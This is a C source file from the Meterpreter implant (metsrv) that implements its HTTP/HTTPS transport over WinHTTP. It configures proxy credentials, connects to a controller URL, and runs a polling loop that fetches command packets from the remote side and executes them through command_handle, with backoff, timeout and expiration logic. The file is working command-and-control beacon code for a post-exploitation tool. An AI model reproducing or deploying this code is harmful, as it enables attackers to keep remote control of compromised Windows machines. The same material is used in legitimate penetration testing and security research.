/*!
 * @file server_setup_winhttp.c
 * @brief Contains functionality that allows for dispatching of HTTP(s) commands via WinHTTP
 * @remark This file doesn't use precompiled headers because metsrv.h includes a bunch of
 *         of definitions that clash with those found in winhttp.h. Hooray Win32 API. I hate you.
 */
#include "../../common/common.h"
#include <winhttp.h>

#ifdef USE_WINHTTP

#define HOSTNAME_LEN 512
#define URLPATH_LEN 1024

DWORD server_dispatch_http_winhttp(Remote* remote, THREAD* dispatchThread)
{
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet * packet = NULL;
	THREAD * cpt = NULL;
	URL_COMPONENTS bits;
	DWORD ecount = 0;
	DWORD delay = 0;
	wchar_t tmpHostName[512];
	wchar_t tmpUrlPath[1024];
	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;

	// Allocate the top-level handle
	if (!wcscmp(ctx->proxy, L"METERPRETER_PROXY"))
	{
		ctx->internet = WinHttpOpen(ctx->ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
	}
	else
	{
		ctx->internet = WinHttpOpen(ctx->ua, WINHTTP_ACCESS_TYPE_NAMED_PROXY, ctx->proxy, NULL, 0);
	}

	if (!ctx->internet)
	{
		dprintf("[DISPATCH] Failed WinHttpOpen: %d", GetLastError());
		return 0;
	}

	// Proxy auth, if required.
	if (wcscmp(ctx->proxy_user, L"METERPRETER_USERNAME_PROXY") != 0)
	{
		if (!WinHttpSetOption(ctx->internet, WINHTTP_OPTION_PROXY_USERNAME, ctx->proxy_user, lstrlen(ctx->proxy_user) + 1))
		{
			dprintf("[DISPATCH] Failed to set proxy username");
		}
	}
	else if(wcscmp(ctx->proxy_pass, L"METERPRETER_PASSWORD_PROXY") != 0)
	{
		if (!WinHttpSetOption(ctx->internet, WINHTTP_OPTION_PROXY_PASSWORD, ctx->proxy_pass, lstrlen(ctx->proxy_pass) + 1))
		{
			dprintf("[DISPATCH] Failed to set proxy username");
		}
	}

	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", ctx->internet);

	// The InternetCrackUrl method was poorly designed...
	ZeroMemory(tmpHostName, sizeof(tmpHostName));
	ZeroMemory(tmpUrlPath, sizeof(tmpUrlPath));

	ZeroMemory(&bits, sizeof(bits));
	bits.dwStructSize = sizeof(bits);

	bits.dwHostNameLength = HOSTNAME_LEN - 1;
	bits.lpszHostName = tmpHostName;

	bits.dwUrlPathLength = URLPATH_LEN - 1;
	bits.lpszUrlPath = tmpUrlPath;

	WinHttpCrackUrl(remote->transport->url, 0, 0, &bits);

	ctx->uri = _wcsdup(tmpUrlPath);

	dprintf("[DISPATCH] Configured URI: %S", ctx->uri);
	dprintf("[DISPATCH] Host: %S Port: %u", tmpHostName, bits.nPort);

	// Allocate the connection handle
	ctx->connection = WinHttpConnect(ctx->internet, tmpHostName, bits.nPort, 0);
	if (!ctx->connection)
	{
		dprintf("[DISPATCH] Failed WinHttpConnect: %d", GetLastError());
		return 0;
	}

	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", ctx->connection);

	// Bring up the scheduler subsystem.
	result = scheduler_initialize(remote);
	if (result != ERROR_SUCCESS)
	{
		return result;
	}

	while (running)
	{
		if (ctx->comm_timeout != 0 && ctx->comm_last_packet + ctx->comm_timeout < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to communication timeout");
			break;
		}

		if (ctx->expiration_time != 0 && ctx->expiration_time < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to hardcoded expiration time");
			dprintf("Timestamp: %u  Expiration: %u", current_unix_timestamp(), ctx->expiration_time);
			break;
		}

		if (event_poll(dispatchThread->sigterm, 0))
		{
			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}

		dprintf("[DISPATCH] Reading data from the remote side...");
		result = packet_receive_via_http(remote, &packet);
		if (result != ERROR_SUCCESS)
		{
			// Update the timestamp for empty replies
			if (result == ERROR_EMPTY)
			{
				ctx->comm_last_packet = current_unix_timestamp();
			}
			else if (result == ERROR_WINHTTP_SECURE_INVALID_CERT)
			{
				// This means that the certificate validation failed, and so
				// we don't trust who we're connecting with. Bail out.
				break;
			}

			if (ecount < 10)
			{
				delay = 10 * ecount;
			}
			else
			{
				delay = 100 * ecount;
			}

			ecount++;

			dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
			Sleep(min(10000, delay));
			continue;
		}

		ctx->comm_last_packet = current_unix_timestamp();

		// Reset the empty count when we receive a packet
		ecount = 0;

		dprintf("[DISPATCH] Returned result: %d", result);

		running = command_handle(remote, packet);
		dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
	}

	// Close WinInet handles
	WinHttpCloseHandle(ctx->connection);
	WinHttpCloseHandle(ctx->internet);

	dprintf("[DISPATCH] calling scheduler_destroy...");
	scheduler_destroy();

	dprintf("[DISPATCH] calling command_join_threads...");
	command_join_threads();

	dprintf("[DISPATCH] leaving server_dispatch.");

	return result;
}

#endif